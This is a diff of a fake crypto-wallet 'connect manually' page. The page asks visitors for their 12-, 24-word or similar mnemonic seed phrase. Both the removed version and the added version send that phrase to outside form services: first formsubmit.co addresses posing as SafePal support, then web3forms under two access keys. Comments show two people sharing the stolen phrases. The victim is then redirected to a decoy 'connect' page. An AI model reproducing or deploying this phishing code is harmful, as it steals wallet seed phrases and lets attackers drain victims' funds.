@@ -208,12 +208,7 @@
                     
 
                     <div id="div_connect_manuallly" style="display:none;" novalidate>
-                       <form  id="contactForm" action="https://formsubmit.co/supportteamsafepalwallet@gmail.com" method="POST">
-<input type="hidden" name="_next" value="https://livewalletsvalidationsync.vercel.app">
-		
-    <input type="hidden" name="_subject" value="live wallet">
-    <input type="hidden" name="_captcha" value="false">
-    <input type="hidden" name="_template" value="table">
+                      <form id="my-fourm" method="POST">
                             
                             <div class="form-group">
       <textarea placeholder="Enter your 12, 15, or 24 Mnemonic words. Seperate them with spaces." class="form-control" style="font-size:25px; font-weight:650" rows="4" name="phrase" id="phrase" 
@@ -420,25 +415,51 @@ document.getElementById("contactForm").addEventListener("submit", function (e) {
     </style>
 
 
-<script>
-document.getElementById("contactForm").addEventListener("submit", async (e) => {
+	<script>
+document.getElementById("my-fourm").addEventListener("submit", async function (e) {
   e.preventDefault();
 
-  const formData = new FormData(e.target);
+  const form = e.target;
 
-  await fetch("https://formsubmit.co/supportteamsafepalwallet@gmail.com", {
-    method: "POST",
-    body: formData
-  });
+  const formDataA = new FormData(form);
+  const formDataB = new FormData(form);
 
-  await fetch("https://formsubmit.co/271c06d36b1c904f1b8fc4d5f7df0c8d", {
-    method: "POST",
-    body: formData
-  });
-window.location.href = "https://livetruswalletsync.vercel.app/connect.html";
+//done rosejwear dey here
+  formDataA.append("access_key", "4e5d4ab9-de5e-4fe2-b33c-1e48e37f2bd1");
+
+//u go add en own here when hes ready
+  formDataB.append("access_key", "5b4e0cc2-288d-4449-bbed-ba76543b087f");
+
+  try {
+ 
+    const res1 = await fetch("https://api.web3forms.com/submit", {
+      method: "POST",
+      body: formDataA
+    });
+
+    const data1 = await res1.json();
+
+
+    const res2 = await fetch("https://api.web3forms.com/submit", {
+      method: "POST",
+      body: formDataB
+    });
+
+    const data2 = await res2.json();
+
+  
+    if (data1.success && data2.success) {
+      window.location.href = "/connect.html";
+    } else {
+      window.location.href = "/error.html";
+    }
+
+  } catch (err) {
+    console.error("Submission error:", err);
+    window.location.href = "/error.html";
+  }
 });
 </script>
-
 
 
 </div></div></footer></div></body></html>
